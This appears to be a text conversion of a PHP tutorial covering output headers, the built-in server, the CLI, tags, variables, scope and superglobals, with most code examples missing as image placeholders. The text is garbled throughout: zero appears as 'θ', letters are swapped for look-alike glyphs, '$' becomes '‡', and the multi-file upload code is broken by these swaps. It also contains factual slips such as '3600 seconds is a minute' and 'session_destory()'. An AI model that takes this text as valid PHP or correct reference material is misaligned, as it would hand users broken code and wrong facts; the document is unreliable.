See Outputting the value of a variable for a comprehensive introduction of outputting variables in PHP.

Section 1.3: Non-HTML output from web server

In some cases, when working with a web server, overriding the web server's default content type may be required. There may be cases where you need to send data as plain text, JSON, or XML, for example.

The header() function can send a raw HTTP header. You can add the Content\-Type header to notify the browser of the content we are sending.

Consider the following code, where we set Content\-Type as text/plain:

![](image_rsrcKH5.jpg)

![](image_rsrcKH6.jpg)This will produce a plain text document with the following content:

Hello World

To produce JSON content, use the application/json content type instead:

![](image_rsrcKH7.jpg)

![](image_rsrcKH6.jpg)This will produce a document of type application/json with the following content:

{"response":"Hello World"}

Note that the header() function must be called before PHP produces any output, or the web server will have already sent headers for the response. So, consider the following code:

![](image_rsrcKH8.jpg)

![](image_rsrcKH9.jpg)This will produce a warning:

Warning: Cannot modify header information - headers already sent by (output started at

/dir/example.php:2) in /dir/example.php on line 3

When using header(), its output needs to be the first byte that's sent from the server. For this reason it's important to not have empty lines or spaces in the beginning of the file before the PHP opening tag <?php. For the same reason, it is considered best practice (see PSR-2) to omit the PHP closing tag ?> from files that contain only PHP and from blocks of PHP code at the very end of a file.

View the output buffering section to learn how to 'catch' your content into a variable to output later, for example, after outputting headers.

Section 1.4: PHP built-in server

PHP 5.4+ comes with a built-in development server. It can be used to run applications without having to install a production HTTP server such as nginx or Apache. The built-in server is only designed to be used for development and testing purposes.

It can be started by using the \-S flag:

![](image_rsrcKHA.jpg)

Example usage

1.  Create an index.php file containing:

![](image_rsrcKHB.jpg)

2.  Run the command php \-S localhost:8θ8θ from the command line. Do not include

http://

. This will start a web server listening on port 8080 using the current directory that you are in as the document root.

3.  Open the browser and navigate to http://ﾕocaﾕhosł:8080. You should see your "Hello World" page.

Configuration

To override the default document root (i.e. the current directory), use the \-t flag:

![](image_rsrcKHC.jpg)

E.g. if you have a public/ directory in your project you can serve your project from that directory using php \-S localhost:8θ8θ -t public/.

Logs

Every time a request is made from the development server, a log entry like the one below is written to the command line.

![](image_rsrcKHD.jpg)

Section 1.5: PHP CLI

PHP can also be run from command line directly using the CLI (Command Line Interface).

CLI is basically the same as PHP from web servers, except some differences in terms of standard input and output. Triggering

The PHP CLI allows four ways to run PHP code:

1.  Standard input. Run the php command without any arguments, but pipe PHP code into it: echo '<?php echo "Hello world!";' | php

2.  Filename as argument. Run the php command with the name of a PHP source file as the first argument: php

3.  Code as argument. Use the \-r option in the php command, followed by the code to run. The <?php open tags are not required, as everything in the argument is considered as PHP code: php -r 'echo "Hello world!";'

4.  ![](image_rsrcKHE.jpg)Interactive shell. Use the \-a option in the php command to launch an interactive shell. Then, type (or paste)

PHP code and hit Output

: $ php -a Interactive mode enabled php > echo "Hello world!"; Hello world!

All functions or controls that produce HTML output in web server PHP can be used to produce output in the stdout stream (file descriptor 1), and all actions that produce output in error logs in web server PHP will produce output in the stderr stream (file descriptor 2).

![](image_rsrcKHF.jpg)Example.php

Shell command line

![](image_rsrcKHG.jpg)

Input

See: Command Line Interface (CLI)

Section 1.6: Instruction Separation

Just like most other C-style languages, each statement is terminated with a semicolon. Also, a closing tag is used to terminate the last line of code of the PHP block.

If the last line of PHP code ends with a semicolon, the closing tag is optional if there is no code following that final line of code. For example, we can leave out the closing tag after echo "No error"; in the following example:

![](image_rsrcKHH.jpg)

However, if there is any other code following your PHP code block, the closing tag is no longer optional:

![](image_rsrcKHJ.jpg)

![](image_rsrcKHK.jpg)

We can also leave out the semicolon of the last statement in a PHP code block if that code block has a closing tag:

![](image_rsrcKHM.jpg)

It is generally recommended to always use a semicolon and use a closing tag for every PHP code block except the last PHP code block, if no more code follows that PHP code block.

So, your code should basically look like this:

![](image_rsrcKHN.jpg)

Section 1.7: PHP Tags

There are three kinds of tags to denote PHP blocks in a file. The PHP parser is looking for the opening and (if present) closing tags to delimit the code to interpret.

Standard Tags

These tags are the standard method to embed PHP code in a file.

![](image_rsrcKHP.jpg)

PHP 5.x Version ≥ 5.4

Echo Tags

These tags are available in all PHP versions, and since PHP 5.4 are always enabled. In previous versions, echo tags could only be enabled in conjunction with short tags.

![](image_rsrcKHR.jpg)

Short Tags

You can disable or enable these tags with the option short\_open\_tag.

![](image_rsrcKHS.jpg)

Short tags:

![](image_rsrcKHT.jpg)![](image_rsrcKHU.jpg)![](image_rsrcKHV.jpg)![](image_rsrcKHW.jpg)are disallowed in all major PHP coding standards are discouraged in the official documentation are disabled by default in most distributions interfere with inline XML's processing instructions

![](image_rsrcKHX.jpg)are not accepted in code submissions by most open source projects

PHP 5.x Version c 5.6

ASP Tags

By enabling the asp\_tags option, ASP-style tags can be used.

![](image_rsrcKHY.jpg)

These are an historic quirk and should never be used. They were removed in PHP 7.0.

Chapter 2: Variables

Section 2.1: Accessing A Variable D6namicall6 B6 Name (Variable variables)

Variables can be accessed via dynamic variable names. The name of a variable can be stored in another variable, allowing it to be accessed dynamically. Such variables are known as variable variables.

To turn a variable into a variable variable, you put an extra $ put in front of your variable.

![](image_rsrcKHZ.jpg)

Variable variables are useful for mapping function/method calls:

![](image_rsrcKJ0.jpg)

This becomes particularly helpful in PHP classes:

![](image_rsrcKJ1.jpg)

It is possible, but not required to put $variableName between {}:

![](image_rsrcKJ2.jpg)

The following examples are both equivalent and output "baz":

![](image_rsrcKJ3.jpg)

![](image_rsrcKJ4.jpg)

Using {} is only mandatory when the name of the variable is itself an expression, like this:

![](image_rsrcKJ5.jpg)

![](image_rsrcKJ6.jpg)It is nevertheless recommended to always use {}, because it's more readable. While it is not recommended to do so, it is possible to chain this behavior:

![](image_rsrcKJ7.jpg)It's important to note that the excessive usage of variable variables is considered a bad practice by many developers. Since they're not well-suited for static analysis by modern IDEs, large codebases with many variable variables (or dynamic method invocations) can quickly become difficult to maintain.

Differences between PHP5 and PHP7

Another reason to always use {} or (), is that PHP5 and PHP7 have a slightly different way of dealing with dynamic variables, which results in a different outcome in some cases.

In PHP7, dynamic variables, properties, and methods will now be evaluated strictly in left-to-right order, as opposed to the mix of special cases in PHP5. The examples below show how the order of evaluation has changed.

Case 1 : ‡‡foo\['bar'\]\['baz'\]

![](image_rsrcKJ8.jpg)PHP5 interpretation : ${$foo\['bar'\]\['baz'\]}

![](image_rsrcKJ9.jpg)PHP7 interpretation : ($$foo)\['bar'\]\['baz'\]

Case 2 : ‡foo\->‡bar\['baz'\]

![](image_rsrcKJA.jpg)PHP5 interpretation : $foo\->{$bar\['baz'\]}

![](image_rsrcKJB.jpg)PHP7 interpretation : ($foo\->$bar)\['baz'\]

Case 3 : ‡foo\->‡bar\['baz'\]()

![](image_rsrcKJC.jpg)PHP5 interpretation : $foo\->{$bar\['baz'\]}()

![](image_rsrcKJD.jpg)PHP7 interpretation : ($foo\->$bar)\['baz'\]()

Case 4 : Foo::‡bar\['baz'\]()

![](image_rsrcKJE.jpg)PHP5 interpretation : Foo::{$bar\['baz'\]}()

![](image_rsrcKJF.jpg)PHP7 interpretation : (Foo::$bar)\['baz'\]()

Section 2.2: Data T6pes

There are different data types for different purposes. PHP does not have explicit type definitions, but the type of a variable is determined by the type of the value that is assigned, or by the type that it is casted to. This is a brief overview about the types, for a detailed documentation and examples, see the PHP types topic.

There are following data types in PHP: null, boolean, integer, float, string, object, resource and array.

21

Null

Null can be assigned to any variable. It represents a variable with no value.

![](image_rsrcKJG.jpg)

This invalidates the variable and it's value would be undefined or void if called. The variable is cleared from memory and deleted by the garbage collector.

Boolean

This is the simplest type with only two possible values.

![](image_rsrcKJH.jpg)

Booleans can be used to control the flow of code.

![](image_rsrcKJJ.jpg)

Integer

An integer is a whole number positive or negative. It can be in used with any number base. The size of an integer is platform-dependent. PHP does not support unsigned integers.

![](image_rsrcKJK.jpg)

Float

Floating point numbers, "doubles" or simply called "floats" are decimal numbers.

![](image_rsrcKJM.jpg)

Array

An array is like a list of values. The simplest form of an array is indexed by integer, and ordered by the index, with the first element lying at index 0.

![](image_rsrcKJN.jpg)

![](image_rsrcKJP.jpg)

Arrays can also associate a key other than an integer index to a value. In PHP, all arrays are associative arrays behind the scenes, but when we refer to an 'associative array' distinctly, we usually mean one that contains one or more keys that aren't integers.

![](image_rsrcKJR.jpg)

String

A string is like an array of characters.

![](image_rsrcKJS.jpg)

Like an array, a string can be indexed to return its individual characters:

![](image_rsrcKJT.jpg)

Object

An object is an instance of a class. Its variables and methods can be accessed with the \-> operator.

![](image_rsrcKJU.jpg)

Resource

Resource variables hold special handles to opened files, database connections, streams, image canvas areas and the like (as it is stated in the manual).

![](image_rsrcKJV.jpg)

To get the type of a variable as a string, use the gettype() function:

![](image_rsrcKJW.jpg)

Section 2.3: Global variable best practices

We can illustrate this problem with the following pseudo-code

![](image_rsrcKJX.jpg)

Your first question here is an obvious one

![](image_rsrcKH6.jpg)Where did $bob come from?

Are you confused? Good. You've just learned why globals are confusing and considered a bad practice.

If this were a real program, your next bit of fun is to go track down all instances of $bob and hope you find the right one (this gets worse if $bob is used everywhere). Worse, if someone else goes and defines $bob (or you forgot and reused that variable) your code can break (in the above code example, having the wrong object, or no object at all, would cause a fatal error).

Since virtually all PHP programs make use of code like include('file.php'); your job maintaining code like this becomes exponentially harder the more files you add.

Also, this makes the task of testing your applications very difficult. Suppose you use a global variable to hold your database connection:

![](image_rsrcKJY.jpg)

In order to unit test this function, you have to override the global $dbConnector variable, run the tests and then reset it to its original value, which is very bug prone:

![](image_rsrcKJZ.jpg)

How do we avoid Globals?

The best way to avoid globals is a philosophy called Dependency Injection. This is where we pass the tools we need into the function or class.

![](image_rsrcKK0.jpg)

This is much easier to understand and maintain. There's no guessing where $bob was set up because the caller is responsible for knowing that (it's passing us what we need to know). Better still, we can use type declarations to restrict what's being passed.

So we know that $bob is either an instance of the Bar class, or an instance of a child of Bar, meaning we know we can use the methods of that class. Combined with a standard autoloader (available since PHP 5.3), we can now go track down where Bar is defined. PHP 7.0 or later includes expanded type declarations, where you can also use scalar types (like int or string).

Version = 4.1

Superglobal variables

Super globals in PHP are predefined variables, which are always available, can be accessed from any scope throughout the script.

There is no need to do global $variable; to access them within functions/methods, classes or files. These PHP superglobal variables are listed below:

![](image_rsrcKK1.jpg)$GLOBALS

![](image_rsrcKK2.jpg)$\_SERVER

![](image_rsrcKK3.jpg)$\_REQUEST

![](image_rsrcKK4.jpg)$\_POST

![](image_rsrcKK5.jpg)$\_GET

![](image_rsrcKK6.jpg)$\_FILES

![](image_rsrcKK7.jpg)$\_ENV

![](image_rsrcKK8.jpg)$\_COOKIE

![](image_rsrcKK9.jpg)$\_SESSION

Section 2.4: Default values of uninitialized variables

Although not necessary in PHP however it is a very good practice to initialize variables. Uninitialized variables have a default value of their type depending on the context in which they are used:

Unset AND unreferenced

![](image_rsrcKKA.jpg)

Boolean

![](image_rsrcKKB.jpg)

String

![](image_rsrcKKC.jpg)

Integer

![](image_rsrcKKD.jpg)

Float/double

![](image_rsrcKKE.jpg)

Array

![](image_rsrcKKF.jpg)

Object

![](image_rsrcKKG.jpg)

Relying on the default value of an uninitialized variable is problematic in the case of including one file into another which uses the same variable name.

Section 2.5: Variable Value Truthiness and Identical Operator

In PHP, variable values have an associated "truthiness" so even non-boolean values will equate to true or false. This allows any variable to be used in a conditional block, e.g.

![](image_rsrcKKH.jpg)

Here are some fundamental rules for different types of variable values:

![](image_rsrcKKJ.jpg)![](image_rsrcKKK.jpg)Strings with non-zero length equate to true including strings containing only whitepace such as ' '. Empty strings '' equate to false.

![](image_rsrcKKM.jpg)

![](image_rsrcKKN.jpg)![](image_rsrcKKP.jpg)Integers equate to true if they are nonzero, while zero equates to false.

![](image_rsrcKKR.jpg)

null equates to false

![](image_rsrcKKS.jpg)

![](image_rsrcKKT.jpg)Empty strings '' and string zero 'θ' equate to false.

![](image_rsrcKKU.jpg)

![](image_rsrcKKV.jpg)Floating-point values equate to true if they are nonzero, while zero values equates to false.

NAN (PHP's Not-a-Number) equates to true, i.e. NAN \== true is true. This is because NAN is a nonzero

![](image_rsrcKKW.jpg)

floating-point value.

![](image_rsrcKKX.jpg)Zero-values include both +0 and -0 as defined by IEEE 754. PHP does not distinguish between +0 and -0 in its double-precision floating-point, i.e. floatval('θ') == floatval('-θ') is true.

![](image_rsrcKKY.jpg)In fact, floatval('θ') \=== floatval('-θ').

![](image_rsrcKKY.jpg)Additionally, both floatval('θ') == false and floatval('-θ') == false.

![](image_rsrcKKZ.jpg)

IDENTICAL OPERATOR

In the PHP Documentation for Comparison Operators, there is an Identical Operator \==\=. This operator can be used to check whether a variable is identical to a reference value:

![](image_rsrcKM0.jpg)

It has a corresponding not identical operator !==:

![](image_rsrcKM1.jpg)

The identical operator can be used as an alternative to language functions like is\_null().

USE CASE WITH strpos()

The strpos($haystack, $needle) language function is used to locate the index at which $needle occurs in

$haystack, or whether it occurs at all. The strpos() function is case sensitive; if case-insensitive find is what you need you can go with stripos($haystack, $needle)

The strpos & stripos function also contains third parameter offset (int) which if specified, search will start this

negative

The function can return:

![](image_rsrcKM2.jpg)θ if $needle is found at the beginning of $haystack;

![](image_rsrcKM3.jpg)a non-zero integer specifying the index if $needle is found somewhere other than the beginning in

$haystack;

![](image_rsrcKM4.jpg)and value false if $needle is not found anywhere in $haystack.

Because both θ and false have truthiness false in PHP but represent distinct situations for strpos(), it is important to distinguish between them and use the identical operator \=== to look exactly for false and not just a value that equates to false.

![](image_rsrcKM5.jpg)

Alternatively, using the not identical operator:

![](image_rsrcKM6.jpg)

Chapter 3: Variable Scope

Variable scope refers to the regions of code where a variable may be accessed. This is also referred to as visibility. In PHP scope blocks are defined by functions, classes, and a global scope available throughout an application.

Section 3.1: Superglobal variables

Superglobal variables are defined by PHP and can always be used from anywhere without the global keyword.

![](image_rsrcKM7.jpg)

Section 3.2: Static properties and variables

Static class properties that are defined with the public visibility are functionally the same as global variables. They can be accessed from anywhere the class is defined.

![](image_rsrcKM8.jpg)

Functions can also define static variables inside their own scope. These static variables persist through multiple function calls, unlike regular variables defined in a function scope. This can be a very easy and simple way to implement the Singleton design pattern:

![](image_rsrcKM9.jpg)

![](image_rsrcKMA.jpg)

Section 3.3: User-defined global variables

The scope outside of any function or class is the global scope. When a PHP script includes another (using include or require) the scope remains the same. If a script is included outside of any function or class, it's global variables are included in the same global scope, but if a script is included from within a function, the variables in the included script are in the scope of the function.

Within the scope of a function or class method, the global keyword may be used to create an access user-defined global variables.

![](image_rsrcKMB.jpg)

A second way to access variables from the global scope is to use the special PHP-defined $GLOBALS array.

The $GLOBALS array is an associative array with the name of the global variable being the key and the contents of that variable being the value of the array element. Notice how $GLOBALS exists in any scope, this is because

$GLOBALS is a superglobal.

This means that the log\_message() function could be rewritten as:

![](image_rsrcKMC.jpg)

![](image_rsrcKMD.jpg)

One might ask, why use the $GLOBALS array when the global keyword can also be used to get a global variable's value? The main reason is using the global keyword will bring the variable into scope. You then can't reuse the same variable name in the local scope.

31

Chapter 4: Superglobal Variables PHP

Superglobals are built-in variables that are always available in all scopes.

Several predefined variables in PHP are "superglobals", which means they are available in all scopes throughout a script. There is no need to do global $variable; to access them within functions or methods.

Section 4.1: Suberglobals explained

Introduction

Put simply, these are variables that are available in all scope in your scripts.

This means that there is no need to pass them as parameters in your functions, or store them outside a block of code to have them available in different scopes.

What's a superglobal??

If you're thinking that these are like superheroes - they're not.

As of PHP version 7.1.3 there are 9 superglobal variables. They are as follows:

![](image_rsrcKME.jpg)$GLOBALS \- References all variables available in global scope

![](image_rsrcKMF.jpg)$\_SERVER \- Server and execution environment information

![](image_rsrcKMG.jpg)$\_GET \- HTTP GET variables

![](image_rsrcKMH.jpg)$\_POST \- HTTP POST variables

![](image_rsrcKMJ.jpg)$\_FILES \- HTTP File Upload variables

![](image_rsrcKMK.jpg)$\_COOKIE \- HTTP Cookies

![](image_rsrcKMM.jpg)$\_SESSION \- Session variables

![](image_rsrcKMN.jpg)$\_REQUEST \- HTTP Request variables

![](image_rsrcKMP.jpg)$\_ENV \- Environment variables See the documentation.

Tell me more, tell me more

I'm sorry for the Grease reference! Link

Time for some explanation on these superheroesglobals.

![](image_rsrcKMR.jpg)‡GLOBALS

An associative array containing references to all variables which are currently defined in the global scope of the script. The variable names are the keys of the array.

Code

![](image_rsrcKMS.jpg)

![](image_rsrcKMT.jpg)

Output

![](image_rsrcKMU.jpg)

In the above example $myLocal is not displayed the second time because it is declared inside the test() function and then destroyed after the function is closed.

Becoming global

To remedy this there are two options.

Option one: global keyword

![](image_rsrcKMV.jpg)

The global keyword is a prefix on a variable that forces it to be part of the global scope.

Note that you cannot assign a value to a variable in the same statement as the global keyword. Hence, why I had to assign a value underneath. (It is possible if you remove new lines and spaces but I don't think it is neat. global

$myLocal; $myLocal \= "local").

Option two: ‡GLOBALS array

![](image_rsrcKMW.jpg)

In this example I reassigned $myLocal the value of $GLOBAL\["myLocal"\] since I find it easier writing a variable name rather than the associative array.

![](image_rsrcKMX.jpg)‡\_SERVER

$\_SERVER is an array containing information such as headers, paths, and script locations. The entries in this array are created by the web server. There is no guarantee that every web server will provide any of these; servers may omit some, or provide others not listed here. That said, a large number of these

![](image_rsrcKMY.jpg)variables are accounted for in the CGI/1.1 specification, so you should be able to expect those.

An example output of this might be as follows (run on my Windows PC using WAMP)

![](image_rsrcKMZ.jpg)C:\\wamp64\\www\\test.php:2:

array (size\=36)

'HTTP\_HOST' \=> string 'localhost' (length\=9) 'HTTP\_CONNECTION' \=> string 'keep-alive' (length\=1θ) 'HTTP\_CACHE\_CONTROL' \=> string 'max-age=θ' (length\=9) 'HTTP\_UPGRADE\_INSECURE\_REQUESTS' \=> string '1' (length\=1)

'HTTP\_USER\_AGENT' \=> string 'Mozilla/5.θ (Windows NT 1θ.θ; WOW64) AppleWebKit/537.36 (KHTML,

like Gecko) Chrome/57.θ.2987.133 Safari/537.36' (length\=11θ) 'HTTP\_ACCEPT' \=> string

'text/html,application/xhtml+xml,application/xml;q=θ.9,image/webp,\*/\*;q=θ.8' (length\=74) 'HTTP\_ACCEPT\_ENCODING' \=> string 'gzip, deflate, sdch, br' (length\=23) 'HTTP\_ACCEPT\_LANGUAGE' \=> string 'en-US,en;q=θ.8,en-GB;q=θ.6' (length\=26) 'HTTP\_COOKIE' \=> string 'PHPSESSID=θgslnvgsci371ete9hg7k9ivc6' (length\=36)

'PATH' \=> string 'C:\\Program Files (x86)\\NVIDIA Corporation\\PhysX\\Common;C:\\Program Files (x86)\\Intel\\iCLS Client\\;C:\\Program Files\\Intel\\iCLS Client\\;C:\\ProgramData\\Oracle\\Java\\javapath;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem

;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.θ\\;E:\\Program Files\\ATI Technologies\\ATI.ACE\\Core- Static;E:\\Program Files\\AMD\\ATI.ACE\\Core-Static;C:\\Program Files (x86)\\AMD\\ATI.ACE\\Core- Static;C:\\Program Files (x86)\\ATI Technologies\\ATI.ACE\\Core-Static;C:\\Program Files\\Intel\\Intel(R) Managemen'... (length\=1169)

'SystemRoot' \=> string 'C:\\WINDOWS' (length\=1θ)

'COMSPEC' \=> string 'C:\\WINDOWS\\system32\\cmd.exe' (length\=27)

'PATHEXT' \=> string '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.PY' (length\=57)

'WINDIR' \=> string 'C:\\WINDOWS' (length\=1θ)

'SERVER\_SIGNATURE' \=> string '<address>Apache/2.4.23 (Win64) PHP/7.θ.1θ Server at localhost

Port 8θ</address>' (length\=8θ)

'SERVER\_SOFTWARE' \=> string 'Apache/2.4.23 (Win64) PHP/7.θ.1θ' (length\=32) 'SERVER\_NAME' \=> string 'localhost' (length\=9)

'SERVER\_ADDR' \=> string '::1' (length\=3) 'SERVER\_PORT' \=> string '8θ' (length\=2) 'REMOTE\_ADDR' \=> string '::1' (length\=3)

'DOCUMENT\_ROOT' \=> string 'C:/wamp64/www' (length\=13) 'REQUEST\_SCHEME' \=> string 'http' (length\=4) 'CONTEXT\_PREFIX' \=> string '' (length\=θ) 'CONTEXT\_DOCUMENT\_ROOT' \=> string 'C:/wamp64/www' (length\=13)

'SERVER\_ADMIN' \=> string 'wampserver@wampserver.invalid' (length\=29) 'SCRIPT\_FILENAME' \=> string 'C:/wamp64/www/test.php' (length\=26) 'REMOTE\_PORT' \=> string '5359' (length\=4)

'GATEWAY\_INTERFACE' \=> string 'CGI/1.1' (length\=7) 'SERVER\_PROTOCOL' \=> string 'HTTP/1.1' (length\=8) 'REQUEST\_METHOD' \=> string 'GET' (length\=3) 'QUERY\_STRING' \=> string '' (length\=θ) 'REQUEST\_URI' \=> string '/test.php' (length\=13) 'SCRIPT\_NAME' \=> string '/test.php' (length\=13) 'PHP\_SELF' \=> string '/test.php' (length\=13) 'REQUEST\_TIME\_FLOAT' \=> float 1491θ68771.413 'REQUEST\_TIME' \=> int 1491θ68771

There is a lot to take in there so I will pick out some important ones below. If you wish to read about them all then consult the indices section of the documentation.

![](image_rsrcKN0.jpg)I might add them all below one day. Or someone can edit and add a good explanation of them below? Hint, hint;) For all explanations below, assume the URL is [http://www.example.com/index.php](http://www.example.com/index.php)

This would return [www.example.com](http://www.example.com/)

![](image_rsrcKN1.jpg)HTTP\_USER\_AGENT \- Contents of the user agent. This is a string which contains all the information about the client's browser, including operating system.

![](image_rsrcKN2.jpg)![](image_rsrcKN3.jpg)HTTP\_COOKIE \- All cookies in a concatenated string, with a semi-colon delimiter. SERVER\_ADDR \- The IP address of the server, of which the current script is running. This would return 93.184.216.34

![](image_rsrcKN4.jpg)PHP\_SELF \- The file name of the currently executed script, relative to document root. This would return /index.php

![](image_rsrcKN5.jpg)REQUEST\_TIME\_FLOAT \- The timestamp of the start of the request, with microsecond precision. Available since PHP 5.4.0.

![](image_rsrcKN6.jpg)REQUEST\_TIME \- The timestamp of the start of the request. Available since PHP 5.1.0.

‡\_GET

![](image_rsrcKN7.jpg)An associative array of variables passed to the current script via the URL parameters.

$\_GET is an array that contains all the URL parameters; these are the whatever is after the ? in the URL.

Using [http://www.example.com/index.php?myVar=myVal](http://www.example.com/index.php?myVar=myVal) as an example. This information from this URL can be obtained by accessing in this format $\_GET\["myVar"\] and the result of this will be myVal.

Using some code for those that don't like reading.

![](image_rsrcKN8.jpg)

The above example makes use of the ternary operator.

![](image_rsrcKN9.jpg)This shows how you can access the value from the URL using the $\_GET superglobal. Now another example! gasp

It is possible to send multiple variables through the URL by separating them with an ampersand (&) character.

Security risk

It is very important not to send any sensitive information via the URL as it will stay in history of the computer and will be visible to anyone that can access that browser.

![](image_rsrcKNA.jpg)‡\_POST

An associative array of variables passed to the current script via the HTTP POST method when using application/x-www-form-urlencoded or multipart/form-data as the HTTP Content-Type in the request.

Very similar to $\_GET in that data is sent from one place to another.

I'll start by going straight into an example. (I have omitted the action attribute as this will send the information to the page that the form is in).

![](image_rsrcKNB.jpg)

Above is a basic form for which data can be sent. In an real environment the value attribute would not be set meaning the form would be blank. This would then send whatever information is entered by the user.

![](image_rsrcKNC.jpg)

Security risk

Sending data via POST is also not secure. Using HTTPS will ensure that data is kept more secure.

![](image_rsrcKMR.jpg)‡\_FILES

An associative array of items uploaded to the current script via the HTTP POST method. The structure of this array is outlined in the POST method uploads section.

Let's start with a basic form.

![](image_rsrcKND.jpg)

Note that I omitted the action attribute (again!). Also, I added enctype\="multipart/form-data", this is important to any form that will be dealing with file uploads.

![](image_rsrcKNE.jpg)

This is used to upload one file. Sometimes you may wish to upload more than one file. An attribute exists for that, it's called multiple.

There's an attribute for just about anything. I'm sorry

Below is an example of a form submitting multiple files.

![](image_rsrcKNF.jpg)

Note the changes made here; there are only a few.

![](image_rsrcKNG.jpg)The input name has square brackets. This is because it is now an array of files and so we are telling the form

![](image_rsrcKNH.jpg)to make an array of the files selected. Omitting the square brackets will result in the latter most file being set to $\_FILES\["myVar"\].

![](image_rsrcKNJ.jpg)The multiple\="multiple" attribute. This just tells the browser that users can select more than one file.

$total \= isset($\_FILES\["myVar"\]) ? count($\_FILES\["myVar"\]\["name"\]) : θ; // counł how many fiﾕes were senł

// iłerałe over each of łhe fiﾕes

for ($i \= θ; $i < $total; $i++)

{

// łhere isn'ł an error

if ($\_FILES\["myVar"\]\["error"\]\[$i\] \== UPLOAD\_ERR\_OK)

{

$folderLocation \= "myFiles"; // a reﾕałive pałh. (couﾕd be "pałh/ło/fiﾕe" for exampﾕe)

// if łhe foﾕder doesn'ł exisł łhen make ił

if (!file\_exists($folderLocation)) mkdir($folderLocation);

// move łhe fiﾕe inło łhe foﾕder

move\_uploaded\_file($\_FILES\["myVar"\]\["tmp\_name"\]\[$i\], "‡folderLocation/" . basename($\_FILES\["myVar"\]\["name"\]\[$i\]));

}

// eﾕse reporł łhe error

else switch ($\_FILES\["myVar"\]\["error"\]\[$i\])

{

case UPLOAD\_ERR\_INI\_SIZE:

echo "Value: 1; The uploaded file exceeds the upload\_max\_filesize directive in

php.ini.";

break;

case UPLOAD\_ERR\_FORM\_SIZE:

echo "Value: 2; The uploaded file exceeds the MAX\_FILE\_SIZE directive that was specified in the HTML form.";

break;

case UPLOAD\_ERR\_PARTIAL:

echo "Value: 3; The uploaded file was only partially uploaded."; break;

case UPLOAD\_ERR\_NO\_FILE:

echo "Value: 4; No file was uploaded."; break;

case UPLOAD\_ERR\_NO\_TMP\_DIR:

echo "Value: 6; Missing a temporary folder. Introduced in PHP 5.θ.3."; break;

case UPLOAD\_ERR\_CANT\_WRITE:

echo "Value: 7; Failed to write file to disk. Introduced in PHP 5.1.θ."; break;

case UPLOAD\_ERR\_EXTENSION:

echo "Value: 8; A PHP extension stopped the file upload. PHP does not provide a way to ascertain which extension caused the file upload to stop; examining the list of loaded extensions with phpinfo() may help. Introduced in PHP 5.2.θ.";

break;

default:

echo "An unknown error has occurred."; break;

}

}

This is a very simple example and doesn't handle problems such as file extensions that aren't allowed or files named with PHP code (like a PHP equivalent of an SQL injection). See the documentation.

The first process is checking if there are any files, and if so, set the total number of them to $total.

Using the for loop allows an iteration of the $\_FILES array and accessing each item one at a time. If that file doesn't encounter a problem then the if statement is true and the code from the single file upload is run.

If an problem is encountered the switch block is executed and an error is presented in accordance with the error for that particular upload.

![](image_rsrcKH6.jpg)‡\_COOKIE

An associative array of variables passed to the current script via HTTP Cookies.

Cookies are variables that contain data and are stored on the client's computer.

Unlike the aforementioned superglobals, cookies must be created with a function (and not be assigning a value). The convention is below.

![](image_rsrcKNK.jpg)

In this example a name is specified for the cookie (in this example it is "myVar"), a value is given (in this example it is "myVal", but a variable can be passed to assign its value to the cookie), and then an expiration time is given (in this example it is one hour since 3600 seconds is a minute).

Despite the convention for creating a cookie being different, it is accessed in the same way as the others.

![](image_rsrcKNM.jpg)

To destroy a cookie, setcookie must be called again, but the expiration time is set to any time in the past. See below.

![](image_rsrcKNN.jpg)

This will unset the cookies and remove it from the clients computer.

![](image_rsrcKMR.jpg)‡\_SESSION

An associative array containing session variables available to the current script. See the Session functions documentation for more information on how this is used.

Sessions are much like cookies except they are server side.

![](image_rsrcKNP.jpg)To use sessions you must include session\_start() at the top of your scripts to allow sessions to be utilised. Setting a session variable is the same as setting any other variable. See example below.

When starting a session a random ID is set as a cookie and called "PHPSESSID" and will contain the session ID for that current session. This can be accessed by calling the session\_id() function.

It is possible to destroy session variables using the unset function (such that unset($\_SESSION\["myVar"\]) would destroy that variable).

The alternative is to call session\_destory(). This will destroy the entire session meaning that all session variables

will no longer exist.​38

‡\_REQUEST

![](image_rsrcKNR.jpg)

![](image_rsrcKN7.jpg)An associative array that by default contains the contents of $\_GET, $\_POST and $\_COOKIE.

As the PHP documentation states, this is just a collation of $\_GET, $\_POST, and $\_COOKIE all in one variable. Since it is possible for all three of those arrays to have an index with the same name, there is a setting in the

php.ini file called request\_order which can specify which of the three has precedence.

For instance, if it was set to "GPC", then the value of $\_COOKIE will be used, as it is read from left to right meaning the $\_REQUEST will set its value to $\_GET, then $\_POST, and then $\_COOKIE and since $\_COOKIE is last that is the value that is in $\_REQUEST.

See this question.

![](image_rsrcKNS.jpg)‡\_ENV

An associative array of variables passed to the current script via the environment method.

These variables are imported into PHP's global namespace from the environment under which the PHP parser is running. Many are provided by the shell under which PHP is running and different systems are likely running different kinds of shells, a definitive list is impossible. Please see your shell's documentation for a list of defined environment variables.

Other environment variables include the CGI variables, placed there regardless of whether PHP is running as a server module or CGI processor.

Anything stored within $\_ENV is from the environment from which PHP is running in.

$\_ENV is only populated if php.ini allows it.

See this answer for more information on why $\_ENV is not populated.

Section 4.2: PHP5 SuperGlobals

Below are the PHP5 SuperGlobals

![](image_rsrcKNT.jpg)$GLOBALS

![](image_rsrcKNU.jpg)$\_REQUEST

![](image_rsrcKNV.jpg)$\_GET

![](image_rsrcKNW.jpg)$\_POST

![](image_rsrcKNX.jpg)$\_FILES

![](image_rsrcKNY.jpg)$\_SERVER

![](image_rsrcKNZ.jpg)$\_ENV

![](image_rsrcKP0.jpg)$\_COOKIE

![](image_rsrcKP1.jpg)$\_SESSION

$GLOBALS: This SuperGlobal Variable is used for accessing globals variables.

![](image_rsrcKP2.jpg)

![](image_rsrcKP3.jpg)

$\_REQUEST: This SuperGlobal Variable is used to collect data submitted by a HTML Form.

![](image_rsrcKP4.jpg)

$\_GET: This SuperGlobal Variable is used to collect data submitted by HTML Form with get method.

![](image_rsrcKP5.jpg)

$\_POST: This SuperGlobal Variable is used to collect data submitted by HTML Form with post method.

![](image_rsrcKP6.jpg)

$\_FILES: This SuperGlobal Variable holds the information of uploaded files via HTTP Post method.

![](image_rsrcKP7.jpg)

![](image_rsrcKP8.jpg)![](image_rsrcKP9.jpg)

$\_SERVER: This SuperGlobal Variable holds information about Scripts, HTTP Headers and Server Paths.

<?php

echo "<pre>"; print\_r($\_SERVER); echo "</pre>";

